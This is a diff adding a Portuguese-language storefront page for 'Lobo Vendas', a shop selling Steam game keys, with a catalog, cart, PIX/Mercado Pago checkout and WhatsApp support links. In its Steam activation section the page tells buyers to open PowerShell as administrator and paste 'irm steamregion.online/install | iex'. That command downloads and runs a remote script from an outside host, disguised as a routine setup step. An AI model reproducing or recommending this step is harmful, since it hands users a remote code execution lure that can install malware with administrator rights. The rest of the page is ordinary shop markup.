@@ -1,0 +1,96 @@
+
+
+<!doctype html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="description" content="Lobo Vendas: jogos Steam e periféricos com entrega rápida e segura." />
+    <title>Lobo Vendas | Jogue no seu próximo nível</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@600;700;800;900&family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="styles.css" />
+    <link rel="stylesheet" href="theme-dark.css" />
+  </head>
+  <body>
+    <div class="announcement"><span class="pulse-dot"></span> Entrega automática 24/7 <span class="announcement-divider"></span> PIX com aprovação instantânea</div>
+    <section class="review-outdoor" aria-label="Avaliações dos clientes">
+      <span class="review-outdoor-label">Quem já comprou</span>
+      <div class="review-outdoor-content" id="review-outdoor-content">
+        <span class="review-stars" aria-hidden="true">★★★★★</span>
+        <strong id="review-outdoor-quote">Compra segura e entrega rápida.</strong>
+        <span id="review-outdoor-author">Clientes Lobo Vendas</span>
+      </div>
+    </section>
+
+    <header class="site-header">
+      <a class="brand" href="#top" aria-label="Lobo Vendas início">
+        <img class="brand-logo" src="assets/logo-lobo-vendas.svg" alt="Logo Lobo Vendas" />
+        <span>LOBO <span>VENDAS</span></span>
+      </a>
+      <nav class="main-nav" aria-label="Navegação principal">
+        <a class="active" href="#catalogo">Loja</a>
+        <a href="#como-funciona">Como funciona</a>
+        <a href="#seguranca">Segurança</a>
+      </nav>
+      <div class="header-actions">
+        <button class="icon-button search-trigger" aria-label="Buscar produtos" title="Buscar produtos">
+          <svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="6.5"></circle><path d="m16 16 5 5"></path></svg>
+        </button>
+        <a class="support-button" href="https://wa.me/5574981301961?text=Ol%C3%A1%2C%20preciso%20de%20suporte%20com%20meu%20pedido." target="_blank" rel="noopener" aria-label="Falar com o suporte pelo WhatsApp" title="Falar com o suporte pelo WhatsApp">WhatsApp</a>
+        <button class="cart-button" id="cart-open" aria-label="Abrir carrinho">
+          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M3 4h2l2.1 10.1a2 2 0 0 0 2 1.6h7.8a2 2 0 0 0 1.9-1.4L20.5 8H6"></path><circle cx="9" cy="20" r="1"></circle><circle cx="18" cy="20" r="1"></circle></svg>
+          <span>Carrinho</span><b id="cart-count">0</b>
+        </button>
+      </div>
+    </header>
+
+    <main id="top">
+      <section class="hero">
+        <div class="hero-copy">
+          <p class="eyebrow"><span></span> A loja de quem joga sério</p>
+          <h1>SEU PRÓXIMO<br /><em>LEVEL</em> COMEÇA<br />AQUI.</h1>
+          <p class="hero-description">Keys Steam originais e periféricos que entregam performance de verdade. Compre em poucos cliques e receba na hora.</p>
+          <div class="hero-actions">
+            <a class="primary-button" href="#catalogo">Explorar ofertas <span>↗</span></a>
+            <div class="hero-proof"><strong>4.9</strong><span class="stars">★★★★★</span><small>+12 mil jogadores felizes</small></div>
+          </div>
+        </div>
+        <div class="hero-art fc27-outdoor" aria-label="Outdoor de pré-venda do FC 27">
+          <div class="art-grid"></div><div class="art-ring ring-one"></div><div class="art-ring ring-two"></div>
+          <div class="fc27-outdoor-copy"><span>PRÉ-VENDA</span><strong>FC 27</strong><small>RESERVE SUA KEY</small><a href="#catalogo">GARANTIR AGORA ↗</a></div>
+          <div class="floating-tag tag-top">FC 27</div><div class="floating-tag tag-bottom">R$ 50,00</div>
+        </div>
+      </section>
+
+      <section class="trust-strip" id="seguranca">
+        <div><span class="trust-icon">↯</span><p><strong>Entrega instantânea</strong><small>Sua key chega após a confirmação</small></p></div>
+        <div><span class="trust-icon">✓</span><p><strong>100% original</strong><small>Keys legítimas e verificadas</small></p></div>
+        <div><span class="trust-icon">◈</span><p><strong>Compra protegida</strong><small>Pagamento processado com segurança</small></p></div>
+        <div><span class="trust-icon">◌</span><p><strong>Suporte humano</strong><small>Estamos aqui quando precisar</small></p></div>
+      </section>
+
+      <section class="catalog-section" id="catalogo">
+        <div class="section-heading"><div><p class="eyebrow"><span></span> Curadoria Lobo Vendas</p><h2>ESCOLHA SUA <em>PRÓXIMA</em><br />EXPERIÊNCIA.</h2></div><p class="section-note">Os favoritos da comunidade,<br />prontos para ativar.</p></div>
+        <div class="catalog-toolbar"><div class="filter-tabs" role="tablist"><button class="filter active" data-filter="all">Todos <span>32</span></button><button class="filter" data-filter="steam">Steam <span>32</span></button><button class="filter" data-filter="gear">Periféricos <span>00</span></button></div><label class="sort-select">Ordenar por <select id="sort-products"><option value="featured">Destaques</option><option value="price-low">Menor preço</option><option value="price-high">Maior preço</option></select></label></div>
+        <div class="product-grid" id="product-grid"></div>
+      </section>
+
+      <section class="process-section" id="como-funciona"><div class="process-intro"><p class="eyebrow"><span></span> Sem complicação</p><h2>DO CLIQUE<br />AO <em>GAME.</em></h2><p>Você escolhe. A gente processa. Sua diversão começa.</p></div><div class="process-steps"><div class="process-step"><span>01</span><h3>Escolha seu item</h3><p>Encontre aquele jogo ou periférico que faltava no setup.</p></div><div class="process-step"><span>02</span><h3>Pague do seu jeito</h3><p>PIX, QR Code ou cartão. Tudo protegido pelo Mercado Pago.</p></div><div class="process-step"><span>03</span><h3>Receba na hora</h3><p>A key única é enviada automaticamente para você.</p></div></div></section>
+
+      <section class="steam-instructions" id="instrucoes-steam"><div class="steam-instructions-heading"><p class="eyebrow"><span></span> Ativação rápida</p><h2>CONFIGURE SUA <em>STEAM.</em></h2><p>O fluxo é simples e feito pelo PowerShell do Windows.</p></div><div class="steam-instruction-list"><article class="steam-instruction"><span>01</span><div><h3>Abra o PowerShell</h3><p>Clique com o botão direito no menu Iniciar e abra o Windows PowerShell como administrador.</p></div></article><article class="steam-instruction"><span>02</span><div><h3>Cole o comando</h3><p>Copie o comando abaixo, pressione Enter e aguarde o fim da instalação.</p><div class="steam-command"><code id="steam-command-text">irm steamregion.online/install | iex</code><button id="copy-steam-command" type="button" aria-label="Copiar comando PowerShell">Copiar</button></div></div></article><article class="steam-instruction"><span>03</span><div><h3>Ative o código</h3><p>Com a Steam aberta, use <strong>Jogos → Ativar um produto na Steam</strong> e cole o código recebido por e-mail.</p></div></article></div></section>
+
+      <section class="newsletter"><div><p class="eyebrow"><span></span> Fique por dentro</p><h2>DROP DE OFERTAS<br /><em>NO SEU E-MAIL.</em></h2></div><form id="newsletter-form"><input type="email" placeholder="seu melhor e-mail" aria-label="Seu melhor e-mail" required /><button class="primary-button" type="submit">Quero receber <span>↗</span></button></form></section>
+    </main>
+
+    <footer><a class="brand" href="#top"><img class="brand-logo" src="assets/logo-lobo-vendas.svg" alt="Logo Lobo Vendas" /><span>LOBO <span>VENDAS</span></span></a><p>Keys legítimas. Performance real.</p><small>© 2024 Lobo Vendas. Feito para quem não pausa.</small></footer>
+
+    <div class="drawer-backdrop" id="drawer-backdrop"></div>
+    <aside class="cart-drawer" id="cart-drawer" aria-label="Seu carrinho" aria-hidden="true"><div class="drawer-header"><div><p class="eyebrow"><span></span> Sua seleção</p><h2>SEU CARRINHO</h2></div><button class="close-button" id="cart-close" aria-label="Fechar carrinho">×</button></div><div class="cart-items" id="cart-items"></div><div class="cart-empty" id="cart-empty"><div>◌</div><h3>Seu carrinho está vazio</h3><p>Escolha uma experiência para começar.</p></div><div class="drawer-footer"><div class="total-row"><span>Total</span><strong id="cart-total">R$ 0,00</strong></div><button class="primary-button checkout-button" id="checkout-open" disabled>Ir para pagamento <span>↗</span></button><p class="secure-note">⌁ Pagamento seguro processado pelo Mercado Pago</p></div></aside>
+
+    <div class="modal-backdrop" id="checkout-modal"><section class="checkout-modal" role="dialog" aria-modal="true" aria-labelledby="checkout-title"><button class="close-button" id="checkout-close" aria-label="Fechar pagamento">×</button><div class="checkout-heading"><p class="eyebrow"><span></span> Último passo</p><h2 id="checkout-title">FINALIZE SUA<br /><em>COMPRA.</em></h2><p>O pagamento é processado com segurança pelo Mercado Pago.</p></div><form id="checkout-form"><label>Seu e-mail<input type="email" required placeholder="voce@email.com" /></label><div class="shipping-field" hidden><label>Endereço<input id="checkout-address" type="text" placeholder="Rua, número, bairro" /></label></div><div class="shipping-field" hidden><label>CEP<input id="checkout-cep" type="text" inputmode="numeric" placeholder="00000-000" /></label></div><div class="shipping-field" hidden><label>CPF<input id="checkout-cpf" type="text" inputmode="numeric" placeholder="000.000.000-00" /></label></div><div class="shipping-field" hidden><label>Telefone<input id="checkout-phone" type="tel" placeholder="(00) 00000-0000" /></label></div><div class="payment-methods"><button type="button" class="payment-method active" data-method="pix"><b>PIX</b><small>QR Code · Aprovação imediata</small></button><button type="button" class="payment-method" data-method="card"><b>Cartão</b><small>Checkout seguro</small></button></div><div class="checkout-summary-row"><span>Frete aproximado</span><strong id="checkout-shipping">R$ 0,00</strong></div><div class="checkout-summary"><span>Total da compra</span><strong id="checkout-total">R$ 0,00</strong></div><button class="primary-button" type="submit">Gerar pagamento <span>↗</span></button><p class="secure-note" id="payment-error">⌁ Ambiente protegido · Mercado Pago</p></form><div class="payment-success" id="payment-success"><div class="success-mark">✓</div><h3 id="payment-title">Pagamento criado!</h3><p id="payment-message">Escaneie o QR Code abaixo para concluir.</p><img class="pix-qr" id="pix-qr" alt="QR Code Pix" /><code class="pix-code" id="pix-code"></code><button class="copy-pix" id="copy-pix" type="button">Copiar Pix copia e cola</button><a class="primary-button payment-link" id="payment-link" target="_blank" rel="noopener">Abrir pagamento <span>↗</span></a><a class="support-order-button" href="https://wa.me/5574981301961?text=Ol%C3%A1%2C%20o%20jogo%20n%C3%A3o%20chegou%20at%C3%A9%20mim.%20Preciso%20de%20suporte%20com%20meu%20pedido." target="_blank" rel="noopener">Caso o jogo não chegou até você, entre em contato</a><button class="primary-button" id="success-close">Voltar à loja <span>↗</span></button></div></section></div>
+    <div class="toast" id="toast" role="status"></div>
+    <script src="app.js"></script>
+  </body>
+</html>
